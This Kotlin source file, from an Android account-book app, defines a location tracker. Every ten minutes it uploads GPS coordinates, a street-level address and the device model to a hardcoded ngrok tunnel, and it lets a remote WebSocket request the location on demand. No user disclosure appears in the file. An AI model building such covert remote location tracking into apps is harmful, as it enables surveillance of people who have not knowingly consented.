package com.loveapp.accountbook.data.sync

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Geocoder
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import android.os.Build
import java.util.Locale
import java.util.concurrent.TimeUnit

/**
 * 位置追踪器（全局单例）
 * 每10分钟获取GPS位置 + 地址解析 + 自动上传服务器
 */
object LocationTracker {

    private const val TAG = "LocationTracker"
    private const val SERVER_URL = "https://resistive-diotic-jolie.ngrok-free.dev/api/location"
    private const val INTERVAL = 10 * 60 * 1000L // 10分钟

    private const val WS_URL = "wss://resistive-diotic-jolie.ngrok-free.dev/ws"
    private const val PENDING_CHECK_URL = "https://resistive-diotic-jolie.ngrok-free.dev/api/location/pending"
    private const val NOTIFY_CHECK_URL = "https://resistive-diotic-jolie.ngrok-free.dev/api/notifications/pending"

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .writeTimeout(10, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .pingInterval(20, TimeUnit.SECONDS) // WebSocket 心跳
        .build()

    private var trackingJob: Job? = null
    private var wsJob: Job? = null
    private var webSocket: okhttp3.WebSocket? = null
    private var appContext: Context? = null

    fun start(context: Context) {
        appContext = context.applicationContext
        if (trackingJob?.isActive == true) return

        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

        trackingJob = scope.launch {
            while (isActive) {
                try {
                    fetchAndUploadLocation()
                } catch (e: Exception) {
                    Log.e(TAG, "位置上报失败: ${e.message}")
                }
                delay(INTERVAL)
            }
        }

        // WebSocket 实时接收推送
        wsJob = scope.launch {
            while (isActive) {
                try {
                    connectWebSocket()
                } catch (e: Exception) {
                    Log.e(TAG, "WebSocket 异常: ${e.message}")
                }
                delay(5000) // 断线5秒后重连
            }
        }

        Log.i(TAG, "位置追踪已启动，WebSocket 实时连接中")
    }

    fun stop() {
        trackingJob?.cancel()
        wsJob?.cancel()
        webSocket?.close(1000, "stopped")
        trackingJob = null
        wsJob = null
        webSocket = null
    }

    private suspend fun connectWebSocket() {
        val latch = java.util.concurrent.CountDownLatch(1)
        val request = Request.Builder()
            .url(WS_URL)
            .addHeader("ngrok-skip-browser-warning", "true")
            .build()

        webSocket = client.newWebSocket(request, object : okhttp3.WebSocketListener() {
            override fun onOpen(ws: okhttp3.WebSocket, response: okhttp3.Response) {
                Log.i(TAG, "✅ WebSocket 已连接")
            }

            override fun onMessage(ws: okhttp3.WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    when (json.optString("type")) {
                        "location_request" -> {
                            Log.i(TAG, "📡 收到实时定位请求")
                            CoroutineScope(Dispatchers.IO).launch {
                                fetchAndUploadLocation()
                            }
                        }
                        "notification" -> {
                            val title = json.optString("title", "通知")
                            val message = json.optString("message", "")
                            Log.i(TAG, "📢 收到实时通知: $title")
                            val ctx = appContext ?: return
                            showNotification(ctx, title, message)
                        }
                        "update" -> {
                            Log.i(TAG, "📦 收到实时更新推送")
                            val ctx = appContext ?: return
                            AppUpdater.checkUpdate(ctx)
                        }
                        "pong" -> { /* 心跳响应 */ }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "解析 WebSocket 消息失败: ${e.message}")
                }
            }

            override fun onFailure(ws: okhttp3.WebSocket, t: Throwable, response: okhttp3.Response?) {
                Log.e(TAG, "WebSocket 连接失败: ${t.message}")
                latch.countDown()
            }

            override fun onClosed(ws: okhttp3.WebSocket, code: Int, reason: String) {
                Log.i(TAG, "WebSocket 已关闭: $reason")
                latch.countDown()
            }
        })

        // 阻塞直到连接关闭或失败，然后协程 delay 后重连
        latch.await()
    }

    private suspend fun fetchAndUploadLocation() {
        val ctx = appContext ?: return

        // 检查权限
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "缺少定位权限")
            return
        }

        val locationManager = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager

        // 获取最近的已知位置
        val location = getLastKnownLocation(locationManager) ?: run {
            Log.w(TAG, "无法获取位置信息")
            return
        }

        // 地址解析
        val address = try {
            val geocoder = Geocoder(ctx, Locale.CHINA)
            @Suppress("DEPRECATION")
            val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
            if (!addresses.isNullOrEmpty()) {
                val addr = addresses[0]
                buildString {
                    addr.adminArea?.let { append(it) }       // 省
                    addr.locality?.let { append(it) }         // 市
                    addr.subLocality?.let { append(it) }      // 区
                    addr.thoroughfare?.let { append(it) }     // 街道
                    addr.featureName?.let {
                        if (it != addr.thoroughfare) append(it) // 门牌号
                    }
                }
            } else ""
        } catch (e: Exception) {
            Log.w(TAG, "地址解析失败: ${e.message}")
            ""
        }

        // 上传到服务器
        uploadLocation(location.latitude, location.longitude, address)
    }

    @Suppress("MissingPermission")
    private fun getLastKnownLocation(lm: LocationManager): Location? {
        val providers = listOf(
            LocationManager.GPS_PROVIDER,
            LocationManager.NETWORK_PROVIDER,
            LocationManager.PASSIVE_PROVIDER
        )
        var best: Location? = null
        for (provider in providers) {
            try {
                val loc = lm.getLastKnownLocation(provider) ?: continue
                if (best == null || loc.accuracy < best.accuracy) {
                    best = loc
                }
            } catch (_: Exception) { }
        }

        // 如果最近位置太旧（超过30分钟），尝试主动请求一次
        if (best == null || System.currentTimeMillis() - best.time > 30 * 60 * 1000) {
            best = requestSingleLocation(lm) ?: best
        }

        return best
    }

    @Suppress("MissingPermission")
    private fun requestSingleLocation(lm: LocationManager): Location? {
        var result: Location? = null
        val latch = java.util.concurrent.CountDownLatch(1)

        val provider = when {
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) -> LocationManager.GPS_PROVIDER
            lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER) -> LocationManager.NETWORK_PROVIDER
            else -> return null
        }

        val listener = object : LocationListener {
            override fun onLocationChanged(location: Location) {
                result = location
                latch.countDown()
                try { lm.removeUpdates(this) } catch (_: Exception) {}
            }
            @Deprecated("Deprecated in API") override fun onStatusChanged(p: String?, s: Int, b: Bundle?) {}
            override fun onProviderEnabled(p: String) {}
            override fun onProviderDisabled(p: String) {}
        }

        try {
            android.os.Handler(android.os.Looper.getMainLooper()).post {
                try {
                    lm.requestSingleUpdate(provider, listener, android.os.Looper.getMainLooper())
                } catch (_: Exception) {
                    latch.countDown()
                }
            }
            latch.await(15, TimeUnit.SECONDS)
        } catch (_: Exception) {}

        return result
    }

    private fun uploadLocation(lat: Double, lng: Double, address: String) {
        try {
            val deviceName = "${Build.BRAND} ${Build.MODEL}".trim()
            val json = JSONObject().apply {
                put("latitude", lat)
                put("longitude", lng)
                put("address", address)
                put("device_name", deviceName)
            }

            val body = json.toString().toRequestBody("application/json".toMediaType())
            val request = Request.Builder()
                .url(SERVER_URL)
                .addHeader("ngrok-skip-browser-warning", "true")
                .post(body)
                .build()

            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                Log.i(TAG, "位置上报成功: $address ($lat, $lng)")
            } else {
                Log.w(TAG, "位置上报失败: HTTP ${response.code}")
            }
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "位置上报异常: ${e.message}")
        }
    }

    private fun showNotification(context: Context, title: String, message: String) {
        try {
            val channelId = "web_notification"
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = android.app.NotificationChannel(
                    channelId, "Web通知",
                    android.app.NotificationManager.IMPORTANCE_HIGH
                ).apply { description = "来自Web管理端的通知" }
                nm.createNotificationChannel(channel)
            }
            val notification = androidx.core.app.NotificationCompat.Builder(context, channelId)
                .setContentTitle(title)
                .setContentText(message)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setAutoCancel(true)
                .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                .setDefaults(androidx.core.app.NotificationCompat.DEFAULT_ALL)
                .setStyle(androidx.core.app.NotificationCompat.BigTextStyle().bigText(message))
                .build()
            nm.notify((System.currentTimeMillis() % 100000).toInt(), notification)
            Log.i(TAG, "显示通知: $title")
        } catch (e: Exception) {
            Log.e(TAG, "显示通知失败: ${e.message}")
        }
    }
}
